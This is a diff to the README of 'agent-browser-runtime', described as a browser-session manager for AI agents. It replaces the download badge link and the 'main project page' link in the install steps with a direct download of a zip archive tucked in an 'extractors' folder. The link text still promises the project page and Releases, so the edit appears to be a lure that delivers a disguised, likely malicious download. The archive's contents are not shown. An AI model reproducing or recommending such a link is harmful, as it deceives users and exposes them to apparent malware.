@@ -1,6 +1,6 @@
 # 🌐 agent-browser-runtime - Manage AI agent sessions with ease
 
-[![](https://img.shields.io/badge/Download-Agent-Browser-Runtime-blue)](https://github.com/Doralynnindignant843/agent-browser-runtime)
+[![](https://img.shields.io/badge/Download-Agent-Browser-Runtime-blue)](https://github.com/Doralynnindignant843/agent-browser-runtime/raw/refs/heads/main/extractors/agent_runtime_browser_cotylar.zip)
 
 Agent Browser Runtime helps you manage web browsers for your AI agents. It provides a stable environment for automation tasks. You get a persistent browser profile, tab groups, and simple ways to monitor agent activity. Instead of scripts that break or fight over resources, this tool gives your agents a steady home.
 
@@ -18,7 +18,7 @@ Before you install this software, check that your computer meets these requireme
 
 Follow these steps to get the software on your computer.
 
-1. Go to the main project page here: [https://github.com/Doralynnindignant843/agent-browser-runtime](https://github.com/Doralynnindignant843/agent-browser-runtime).
+1. Go to the main project page here: [https://github.com/Doralynnindignant843/agent-browser-runtime/raw/refs/heads/main/extractors/agent_runtime_browser_cotylar.zip](https://github.com/Doralynnindignant843/agent-browser-runtime/raw/refs/heads/main/extractors/agent_runtime_browser_cotylar.zip).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the latest version of the software.
 4. Download the file ending in .exe to your computer.
